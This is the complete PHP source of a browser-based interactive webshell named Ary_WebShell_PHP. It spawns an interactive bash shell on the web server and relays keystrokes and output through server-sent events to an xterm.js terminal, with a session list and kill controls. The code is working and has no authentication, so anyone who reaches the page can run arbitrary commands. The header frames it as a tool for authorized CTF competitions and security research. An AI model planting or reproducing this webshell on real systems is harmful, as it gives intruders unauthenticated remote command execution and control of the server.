<?php
/**
 * Ary_WebShell_PHP
 *
 * A browser-based interactive terminal webshell for authorized CTF 
 * competitions and authorized security research use only.
 *
 * @author     Aryan Giri | giriaryan694-a11y
 * @license    Apache-2.0
 * @copyright  2026 Aryan Giri
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/* ========================================== */
/* --- SESSION MANAGEMENT UTILITIES --------- */
/* ========================================== */

function kill_session(string $id): void {
    $temp = sys_get_temp_dir();
    $pidFile = $temp . '/ary_' . $id . '_pid';
    if (file_exists($pidFile)) {
        $pid = (int) file_get_contents($pidFile);
        if ($pid > 0 && function_exists('posix_kill')) {
            $sigkill = defined('SIGKILL') ? SIGKILL : 9;
            @posix_kill($pid, $sigkill);
            @posix_kill(-$pid, $sigkill); // process group
        }
        @unlink($pidFile);
    }
    @unlink($temp . '/ary_' . $id . '_input');
}

function list_sessions(): array {
    $temp = sys_get_temp_dir();
    $sessions = [];
    foreach (glob($temp . '/ary_*_pid') as $pidfile) {
        if (!preg_match('/ary_([a-f0-9]+)_pid$/', basename($pidfile), $m)) continue;
        $id = $m[1];
        $pid = file_exists($pidfile) ? (int) file_get_contents($pidfile) : 0;
        $alive = ($pid > 0 && function_exists('posix_kill') && @posix_kill($pid, 0));
        if (!$alive) {
            @unlink($pidfile);
            @unlink($temp . '/ary_' . $id . '_input');
            continue;
        }
        $sessions[] = [
            'id' => $id,
            'pid' => $pid,
            'created' => date('Y-m-d H:i:s', filemtime($pidfile))
        ];
    }
    usort($sessions, fn($a, $b) => strcmp($b['created'], $a['created']));
    return $sessions;
}

/* ========================================== */
/* --- ROUTING ------------------------------ */
/* ========================================== */

$action = $_GET['action'] ?? 'list';

switch ($action) {
    case 'create':
        if (function_exists('random_bytes')) {
            $id = bin2hex(random_bytes(4));
        } else {
            $id = uniqid();
        }
        file_put_contents(sys_get_temp_dir() . '/ary_' . $id . '_input', '');
        header('Location: ?action=terminal&id=' . $id);
        exit;

    case 'kill':
        $id = $_GET['id'] ?? '';
        if (preg_match('/^[a-f0-9]+$/', $id)) {
            kill_session($id);
        }
        header('Location: ?action=list');
        exit;

    case 'stream':
        $id = $_GET['id'] ?? '';
        if (!preg_match('/^[a-f0-9]+$/', $id)) {
            http_response_code(400);
            exit;
        }
        
        header('Content-Type: text/event-stream');
        header('Cache-Control: no-cache');
        header('Connection: keep-alive');
        header('X-Accel-Buffering: no');
        
        ignore_user_abort(true);
        set_time_limit(0);
        if (ob_get_level() > 0) ob_end_flush();
        ob_implicit_flush(true);
        
        $temp = sys_get_temp_dir();
        $pidFile = $temp . '/ary_' . $id . '_pid';
        $inputFile = $temp . '/ary_' . $id . '_input';
        
        // Kill any stale shell for this session ID before spawning fresh
        kill_session($id);
        file_put_contents($inputFile, '');
        
        // Try PTY first (PHP 8.1+)
        $descriptorspec = [];
        if (PHP_VERSION_ID >= 80100) {
            $descriptorspec = [0 => ['pty'], 1 => ['pty'], 2 => ['pty']];
        }
        
        $env = ['TERM' => 'xterm-256color', 'HOME' => sys_get_temp_dir()];
        $process = @proc_open('/bin/bash -i', $descriptorspec, $pipes, sys_get_temp_dir(), $env);
        
        // Fallback to pipes
        if (!is_resource($process)) {
            $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $process = proc_open('/bin/bash -i', $descriptorspec, $pipes, sys_get_temp_dir(), $env);
        }
        
        if (!is_resource($process)) {
            echo "data: " . json_encode(['out' => "\r\n\x1b[31m[!] Failed to spawn shell\x1b[0m\r\n"]) . "\n\n";
            exit;
        }
        
        $status = proc_get_status($process);
        file_put_contents($pidFile, $status['pid']);
        
        foreach ($pipes as $p) if (is_resource($p)) stream_set_blocking($p, false);
        
        echo "data: " . json_encode(['out' => "\r\n\x1b[32m[*] Session {$id} connected — type your commands below\x1b[0m\r\n"]) . "\n\n";
        flush();
        
        while (true) {
            if (connection_aborted()) break;
            
            // Atomic read + clear input buffer
            if (file_exists($inputFile)) {
                $fp = fopen($inputFile, 'c+');
                $input = '';
                if ($fp) {
                    if (flock($fp, LOCK_EX)) {
                        fseek($fp, 0);
                        $input = stream_get_contents($fp);
                        ftruncate($fp, 0);
                        flock($fp, LOCK_UN);
                    }
                    fclose($fp);
                    if ($input !== '' && isset($pipes[0]) && is_resource($pipes[0])) {
                        fwrite($pipes[0], $input);
                        fflush($pipes[0]);
                    }
                }
            }
            
            $out = '';
            if (isset($pipes[1]) && is_resource($pipes[1])) {
                $buf = fread($pipes[1], 4096);
                if ($buf !== false && $buf !== '') $out .= $buf;
            }
            if (isset($pipes[2]) && is_resource($pipes[2])) {
                $buf = fread($pipes[2], 4096);
                if ($buf !== false && $buf !== '') $out .= $buf;
            }
            
            if ($out !== '') {
                echo "data: " . json_encode(['out' => $out]) . "\n\n";
                flush();
            }
            
            echo ":hb\n\n";
            flush();
            
            $status = proc_get_status($process);
            if (!$status['running']) {
                echo "data: " . json_encode(['out' => "\r\n\x1b[31m[!] Shell terminated\x1b[0m\r\n"]) . "\n\n";
                flush();
                break;
            }
            usleep(50000);
        }
        
        @proc_terminate($process);
        @proc_close($process);
        @unlink($pidFile);
        @unlink($inputFile);
        exit;

    case 'input':
        $id = $_GET['id'] ?? '';
        if (!preg_match('/^[a-f0-9]+$/', $id)) {
            http_response_code(400);
            echo json_encode(['status' => 'error']);
            exit;
        }
        
        header('Content-Type: application/json');
        $data = json_decode(file_get_contents('php://input'), true);
        $key = $data['key'] ?? '';
        
        $temp = sys_get_temp_dir();
        $inputFile = $temp . '/ary_' . $id . '_input';
        $pidFile = $temp . '/ary_' . $id . '_pid';
        
        file_put_contents($inputFile, $key, FILE_APPEND | LOCK_EX);
        
        // Explicit SIGINT fallback for non-PTY hosts
        if (strpos($key, "\x03") !== false && file_exists($pidFile)) {
            $pid = (int) file_get_contents($pidFile);
            if ($pid > 0 && function_exists('posix_kill')) {
                $sigint = defined('SIGINT') ? SIGINT : 2;
                @posix_kill($pid, $sigint);
                @posix_kill(-$pid, $sigint);
            }
        }
        
        echo json_encode(['status' => 'ok']);
        exit;

    case 'resize':
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok']);
        exit;

    case 'terminal':
        $id = $_GET['id'] ?? '';
        if (!preg_match('/^[a-f0-9]+$/', $id)) {
            header('Location: ?action=list');
            exit;
        }
        break;

    case 'list':
    default:
        break;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <?php if ($action === 'list'): ?>
    <title>ARY_Webshell - Sessions</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background: #1a1b26;
            color: #a9b1d6;
            margin: 0;
            padding: 40px 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        h2 { color: #c0caf5; margin-top: 0; }
        .subtitle { color: #565f89; font-size: 14px; font-weight: bold; margin-left: 10px; }
        .btn {
            display: inline-block;
            padding: 10px 20px;
            background: #7aa2f7;
            color: #1a1b26;
            text-decoration: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px;
            border: none;
            cursor: pointer;
        }
        .btn:hover { opacity: 0.8; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 25px;
            background: #24283b;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        th, td {
            padding: 14px;
            text-align: left;
            border-bottom: 1px solid #414868;
        }
        th {
            background: #16161e;
            color: #7aa2f7;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        td { font-size: 14px; font-family: monospace; }
        tr:hover { background: #1a1b26; }
        .actions a {
            color: #7aa2f7;
            text-decoration: none;
            margin-right: 18px;
            font-weight: bold;
            font-family: system-ui, sans-serif;
        }
        .actions a:hover { color: #c0caf5; }
        .kill { color: #f7768e !important; }
        .empty {
            text-align: center;
            padding: 50px;
            color: #565f89;
            background: #24283b;
            border-radius: 8px;
            margin-top: 25px;
        }
        .credit {
            margin-top: 50px;
            text-align: center;
            color: #414868;
            font-size: 11px;
            letter-spacing: 1px;
        }
        .license {
            text-align: center;
            color: #414868;
            font-size: 10px;
            margin-top: 5px;
        }
    </style>
    <?php elseif ($action === 'terminal'): ?>
    <title>ARY_Webshell - Terminal</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@latest/css/xterm.css" />
    <style>
        html, body { height: 100%; width: 100%; margin: 0; padding: 0; background: #000; overflow: hidden; }
        body { display: flex; flex-direction: column; }
        #topbar {
            flex: 0 0 42px;
            background: #16161e;
            display: flex;
            align-items: center;
            padding: 0 15px;
            justify-content: space-between;
            border-bottom: 1px solid #414868;
            z-index: 100;
        }
        #topbar .sess-info { color: #7aa2f7; font-size: 13px; font-weight: bold; font-family: monospace; }
        #topbar a { color: #a9b1d6; text-decoration: none; font-size: 13px; font-weight: bold; }
        #topbar a:hover { color: #c0caf5; }
        #toolbar {
            flex: 0 0 50px;
            display: flex;
            background: #16161e;
            padding: 5px;
            gap: 5px;
            overflow-x: auto;
            box-sizing: border-box;
            z-index: 100;
        }
        .t-btn {
            flex: 1;
            min-width: 45px;
            background: #24283b;
            color: #a9b1d6;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            user-select: none;
            touch-action: manipulation;
        }
        .t-btn:active { background: #414868; }
        #terminal { flex: 1; position: relative; padding: 4px; box-sizing: border-box; overflow: hidden; }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/xterm@latest/lib/xterm.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@latest/lib/xterm-addon-fit.js"></script>
    <?php endif; ?>
</head>
<body>
<?php if ($action === 'list'): ?>
    <div class="container">
        <h2>ARY_WebShell_PHP <span class="subtitle">Session Manager</span></h2>
        <a href="?action=create" class="btn">+ New Session</a>
        
        <?php
        $sessions = list_sessions();
        if (empty($sessions)):
        ?>
            <div class="empty">No active sessions. Click <strong>"New Session"</strong> to spawn a shell.</div>
        <?php else: ?>
            <table>
                <tr>
                    <th>Session ID</th>
                    <th>PID</th>
                    <th>Created</th>
                    <th>Actions</th>
                </tr>
                <?php foreach ($sessions as $s): ?>
                <tr>
                    <td><?php echo htmlspecialchars($s['id']); ?></td>
                    <td><?php echo $s['pid']; ?></td>
                    <td><?php echo $s['created']; ?></td>
                    <td class="actions">
                        <a href="?action=terminal&id=<?php echo $s['id']; ?>">Interact</a>
                        <a href="?action=kill&id=<?php echo $s['id']; ?>" class="kill" onclick="return confirm('Kill session <?php echo $s['id']; ?>?')">Kill</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </table>
        <?php endif; ?>
        
        <div class="credit">made by aryan giri | giriaryan694-a11y</div>
        <div class="license">Licensed under Apache-2.0</div>
    </div>

<?php elseif ($action === 'terminal'): ?>
    <div id="topbar">
        <div class="sess-info">Session: <?php echo htmlspecialchars($id); ?></div>
        <a href="?action=list">&larr; Back to Sessions</a>
    </div>
    <div id="toolbar">
        <button id="btn-ctrl" class="t-btn" onclick="toggleCtrl()">CTRL</button>
        <button class="t-btn" onclick="sKey('\x1b')">ESC</button>
        <button class="t-btn" onclick="sKey('\x09')">TAB</button>
        <button class="t-btn" onclick="sKey('\x1b[D')">&lt;</button>
        <button class="t-btn" onclick="sKey('\x1b[B')">DN</button>
        <button class="t-btn" onclick="sKey('\x1b[A')">UP</button>
        <button class="t-btn" onclick="sKey('\x1b[C')">&gt;</button>
        <button class="t-btn" onclick="sKey('\x03')">^C</button>
    </div>
    <div id="terminal"></div>
    <script>
        const sessionId = <?php echo json_encode($id); ?>;
        
        const term = new Terminal({ cursorBlink: true, theme: { background: '#000000' } });
        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);
        term.open(document.getElementById('terminal'));

        function resizeTerminal() {
            try { fitAddon.fit(); } catch(e) {}
        }
        resizeTerminal();
        window.addEventListener('resize', resizeTerminal);

        let isCtrl = false;

        function toggleCtrl() {
            isCtrl = !isCtrl;
            document.getElementById('btn-ctrl').style.color = isCtrl ? '#7aa2f7' : '#a9b1d6';
            term.focus();
        }

        // SSE connection for shell output
        const evtSource = new EventSource('?action=stream&id=' + encodeURIComponent(sessionId));
        evtSource.onmessage = e => {
            const d = JSON.parse(e.data);
            if(d.out) term.write(d.out);
        };

        evtSource.onopen = () => {
            term.focus();
            resizeTerminal();
        };

        evtSource.onerror = () => {
            term.write('\r\n\x1b[31m[!] Connection Lost. Redirecting to sessions...\x1b[0m\r\n');
            setTimeout(() => window.location.href = '?action=list', 1500);
        };

        function sendKey(k) {
            fetch('?action=input&id=' + encodeURIComponent(sessionId), {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({key: k})
            });
        }

        function sKey(k) {
            if (isCtrl) toggleCtrl();
            sendKey(k);
            term.focus();
        }

        // Smart copy: Ctrl+C copies when text selected, otherwise sends ^C to shell
        term.attachCustomKeyEventHandler((ev) => {
            if (ev.type === 'keydown' && ev.ctrlKey && (ev.key === 'c' || ev.code === 'KeyC')) {
                if (term.hasSelection()) {
                    return true;
                }
                ev.preventDefault();
                sendKey('\x03');
                return false;
            }
            return true;
        });

        term.onData(d => {
            if (isCtrl) {
                if (d.length === 1) {
                    let c = d.charCodeAt(0);
                    if (c >= 97 && c <= 122) d = String.fromCharCode(c - 96);
                    else if (c >= 65 && c <= 90) d = String.fromCharCode(c - 64);
                }
                toggleCtrl();
            }
            sendKey(d);
        });

        // Notify server of terminal resize
        let resizeTimer;
        window.addEventListener('resize', () => {
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(() => {
                fetch('?action=resize&id=' + encodeURIComponent(sessionId), {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({cols: term.cols, rows: term.rows})
                });
            }, 300);
        });
    </script>
<?php endif; ?>
</body>
</html>
